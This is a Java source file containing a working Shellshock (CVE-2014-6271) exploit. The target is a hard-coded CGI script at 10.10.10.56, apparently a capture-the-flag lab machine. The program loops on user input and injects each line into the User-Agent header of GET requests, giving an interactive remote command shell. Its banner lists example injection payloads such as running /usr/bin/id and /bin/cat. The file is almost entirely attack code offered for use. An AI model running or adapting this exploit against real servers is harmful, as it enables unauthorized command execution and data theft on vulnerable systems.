package com.journaldev.utils;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

public class ShockerExploitScriptJava {

	private static final String url = "http://10.10.10.56/cgi-bin/user.sh";

	public static void main(String[] args) throws IOException {
		op();
		while(true) {
			send_get();
		}
	}
	
	private static void op() throws IOException {
		System.out.println("---------------------------");
		System.out.println("--- SHELLSHOCK,Bashdoor ---");	
		System.out.println("---     CVE-2014-6271   ---");
		System.out.println("---------------------------\n");
		
		System.out.println("Target: " + url);
		System.out.println("-- Usage:");
		System.out.println("() { :;}; echo; <command location> <argument>");
		System.out.println("-- Example:");
		System.out.println("() { :;}; echo; /usr/bin/id");
		System.out.println("() { :;}; echo; /bin/pwd");
		System.out.println("() { :;}; echo; /bin/ls '<argument>'");
		System.out.println("() { :;}; echo; /bin/cat '<argument>'\n");
	}

	private static void send_get() throws IOException {
	
		String userAgent = "";
	
		Scanner myObj = new Scanner(System.in);
    		System.out.print("[+] >> ");
    		String userInput = myObj.nextLine();
    		
		userAgent = userInput;
	
		URL obj = new URL(url);
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
		
		con.setRequestMethod("GET");
		con.setRequestProperty("User-Agent", userAgent);
		
		int responseCode = con.getResponseCode();
		if (responseCode == HttpURLConnection.HTTP_OK) { // success
			BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
			
			String inputLine;
			StringBuffer response = new StringBuffer();

			while ((inputLine = in.readLine()) != null) {
				response.append(inputLine);
			}
			in.close();

			System.out.println(response.toString()+"\n");
		} else {
			System.out.println("[-] GET request failed.");
		}

	}

}